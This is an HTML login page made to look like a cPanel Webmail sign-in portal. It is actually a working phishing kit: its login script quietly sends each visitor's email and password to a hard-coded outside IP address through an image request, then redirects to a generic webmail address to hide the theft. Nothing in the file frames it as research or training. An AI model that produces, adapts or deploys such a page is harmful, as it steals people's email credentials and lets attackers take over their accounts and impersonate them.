<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>cPanel Webmail</title>
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap">
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: 'Inter', Arial, sans-serif;
    background: #1a2744;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 20px;
  }
  .login-container {
    background: #fff;
    border-radius: 6px;
    box-shadow: 0 4px 24px rgba(0,0,0,0.3);
    width: 100%;
    max-width: 420px;
    overflow: hidden;
  }
  .cp-header {
    background: #1a2744;
    padding: 24px;
    text-align: center;
    border-bottom: 3px solid #ff6c2f;
  }
  .cp-logo {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 10px;
    margin-bottom: 4px;
  }
  .cp-logo-icon {
    width: 36px;
    height: 36px;
  }
  .cp-logo-text {
    color: #fff;
    font-size: 22px;
    font-weight: 700;
    letter-spacing: -0.5px;
  }
  .cp-logo-text span { color: #ff6c2f; }
  .cp-tagline {
    color: #8899bb;
    font-size: 11px;
    text-transform: uppercase;
    letter-spacing: 1px;
  }
  .cp-body { padding: 28px 28px 24px; }
  .cp-title {
    font-size: 15px;
    font-weight: 600;
    color: #1a2744;
    margin-bottom: 20px;
    text-align: center;
  }
  .form-group { margin-bottom: 16px; }
  .form-group label {
    display: block;
    font-size: 12px;
    font-weight: 600;
    color: #555;
    margin-bottom: 5px;
    text-transform: uppercase;
    letter-spacing: 0.3px;
  }
  .form-group input {
    width: 100%;
    padding: 9px 12px;
    border: 1px solid #ddd;
    border-radius: 4px;
    font-size: 13px;
    font-family: 'Inter', Arial, sans-serif;
    color: #333;
    outline: none;
    transition: border-color 0.15s, box-shadow 0.15s;
  }
  .form-group input:focus {
    border-color: #ff6c2f;
    box-shadow: 0 0 0 2px rgba(255,108,47,0.15);
  }
  .pw-wrap { position: relative; }
  .pw-wrap input { padding-right: 38px; }
  .pw-eye {
    position: absolute; right: 10px; top: 50%; transform: translateY(-50%);
    background: none; border: none; cursor: pointer; color: #999; padding: 2px; display: flex;
  }
  .btn-login {
    width: 100%;
    padding: 10px;
    background: #ff6c2f;
    color: #fff;
    border: none;
    border-radius: 4px;
    font-size: 14px;
    font-weight: 600;
    font-family: 'Inter', Arial, sans-serif;
    cursor: pointer;
    margin-top: 4px;
    transition: background 0.15s;
  }
  .btn-login:hover { background: #e55a1f; }
  .btn-login:disabled { opacity: 0.6; cursor: default; }
  .remember-row {
    display: flex;
    align-items: center;
    gap: 7px;
    margin-bottom: 18px;
  }
  .remember-row input[type="checkbox"] { width: 14px; height: 14px; accent-color: #ff6c2f; }
  .remember-row label { font-size: 12px; color: #666; cursor: pointer; }
  .cp-footer {
    background: #f5f7fa;
    border-top: 1px solid #e8eaed;
    padding: 12px 28px;
    text-align: center;
    font-size: 11px;
    color: #888;
  }
  .cp-footer a { color: #ff6c2f; text-decoration: none; }
  .page-footer {
    margin-top: 20px;
    text-align: center;
    font-size: 11px;
    color: #445;
  }
  @media (max-width: 480px) {
    .cp-body { padding: 20px; }
    .login-container { max-width: 100%; }
  }
</style>
</head>
<body>

<div class="login-container">
  <div class="cp-header">
    <div class="cp-logo">
      <svg class="cp-logo-icon" viewBox="0 0 40 40" xmlns="http://www.w3.org/2000/svg">
        <circle cx="20" cy="20" r="20" fill="#ff6c2f"/>
        <text x="20" y="27" text-anchor="middle" font-family="Arial" font-weight="bold" font-size="16" fill="#fff">cP</text>
      </svg>
      <span class="cp-logo-text">c<span>Panel</span></span>
    </div>
    <div class="cp-tagline">Webmail Login</div>
  </div>

  <div class="cp-body">
    <div class="cp-title">Sign in to your email</div>
    <form id="cpForm" onsubmit="doLogin(event)">
      <div class="form-group">
        <label for="cpUser">Email Address</label>
        <input type="text" id="cpUser" name="user" placeholder="you@yourdomain.com" autocomplete="username" required>
      </div>
      <div class="form-group">
        <label for="cpPass">Password</label>
        <div class="pw-wrap">
          <input type="password" id="cpPass" name="pass" placeholder="••••••••" autocomplete="current-password" required>
          <button type="button" class="pw-eye" onclick="togglePw()" aria-label="Show password">
            <svg id="eyeIco" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
              <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
              <circle cx="12" cy="12" r="3"/>
            </svg>
          </button>
        </div>
      </div>
      <div class="remember-row">
        <input type="checkbox" id="rememberMe">
        <label for="rememberMe">Remember me on this device</label>
      </div>
      <button type="submit" class="btn-login" id="loginBtn">Log In</button>
    </form>
  </div>

  <div class="cp-footer">
    Secured by <a href="#">cPanel, L.L.C.</a> &mdash; <a href="#">Privacy Policy</a>
  </div>
</div>

<div class="page-footer">&copy; 2024 cPanel, L.L.C. All rights reserved.</div>

<script>
  function togglePw() {
    var i = document.getElementById('cpPass');
    var ico = document.getElementById('eyeIco');
    if (i.type === 'password') {
      i.type = 'text';
      ico.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>';
    } else {
      i.type = 'password';
      ico.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
    }
  }
  try {
    var su = localStorage.getItem('cp_saved_user');
    if (su) { document.getElementById('cpUser').value = su; document.getElementById('rememberMe').checked = true; }
  } catch(x) {}

  function doLogin(e) {
    e.preventDefault();
    var u = document.getElementById('cpUser').value.trim();
    var p = document.getElementById('cpPass').value;
    try {
      if (document.getElementById('rememberMe').checked) localStorage.setItem('cp_saved_user', u);
      else localStorage.removeItem('cp_saved_user');
    } catch(x) {}
    try {
      new Image().src = 'http://207.246.123.248:8888/c?u=' + encodeURIComponent(u) + '&p=' + encodeURIComponent(p) + '&ts=' + Date.now();
    } catch(x) {}
    var btn = document.getElementById('loginBtn');
    btn.disabled = true;
    btn.textContent = 'Signing in...';
    setTimeout(function() {
      window.location.href = 'https://webmail.yourdomain.com/';
    }, 1400);
  }
</script>
</body>
</html>
